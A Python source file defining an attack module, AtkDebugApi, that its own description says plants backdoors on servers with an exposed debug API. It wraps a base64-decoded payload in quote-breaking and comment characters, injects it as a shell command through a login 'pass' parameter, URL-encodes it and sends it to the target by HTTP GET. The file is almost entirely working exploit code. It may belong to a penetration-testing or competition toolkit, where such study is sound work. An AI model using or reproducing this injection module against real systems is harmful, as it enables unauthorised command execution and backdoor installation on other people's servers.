#!/usr/bin/env python
# coding: UTF-8
import requests
import json
import sys
import base64

class AtkDebugApi(object):
    def __init__(self, utility, host="127.0.0.1", port="3000", debug=False):
        self.utility = utility
        self.host = host
        self.port = port
        self.ua = utility.ua
        self.debug = debug
        self.request_header = 'a"}\'; '
        self.request_footer = '; echo # '
        self.description = "The module can be set some backdoors if Debug API was open publicaly."
        self.target = host + ":" + port

    def __str__(self):
        return 'AtkDebugApi object (target: %s, description: %s)' % (self.url, self.description)

    __repr__ = __str__
    

    def sendattack(self, path, b64data):
        targethost = self.target
        #payload = base64.b64decode(b64data.encode()).decode()
        payload = self.request_header + base64.b64decode(b64data.encode()).decode() + self.request_footer
        params = {"user": "a", "pass": payload}
        get_params = self.generate_get_params(params)

        #proxy
        #proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
        proxies = {"http": None,"https": None}
        
        
        #connect timeout, read timeout
        timeoutvalue= (5.0, 5.5)

        try:
            self.logger("Attack Start", "+")

            session = requests.Session()
            target_url1 = "http://" + targethost + path + "?" + get_params
            
            if self.debug:
                self.logger("target_url: %s" % target_url1, "+")
            
            # send request
            headers = { "User-Agent": self.ua }
            response1 = session.get(target_url1, proxies=proxies, headers=headers, timeout=timeoutvalue)
            
            self.logger("Attack End", "+")

        except requests.exceptions.RequestException as e:
            self.logger("Error occurred", "!")
            file=sys.stderr
            print(e)
            #sys.exit(1)

    def logger(self, m="", o="+"):
        message = "[{}] {}".format(o,m)
        print(message)

    def generate_get_params(self, params):
        get_params = ""
        for key, value in params.items():
            s = value
            s = s.replace("%", "%25")
            s = s.replace(" ", "%20")
            s = s.replace("&", "%26")
            s = s.replace("'", "%27")
            s = s.replace("#", "%23")
            s = s.replace("/", "%2F")
            s = s.replace(":", "%3A")
            s = s.replace(";", "%3B")
            s = s.replace("<", "%3C")
            s = s.replace("=", "%3D")
            s = s.replace(">", "%3E")
            s = s.replace("?", "%3F")
            s = s.replace("|", "%7C")
            get_params += key + "=" + s + "&"
        return get_params
    
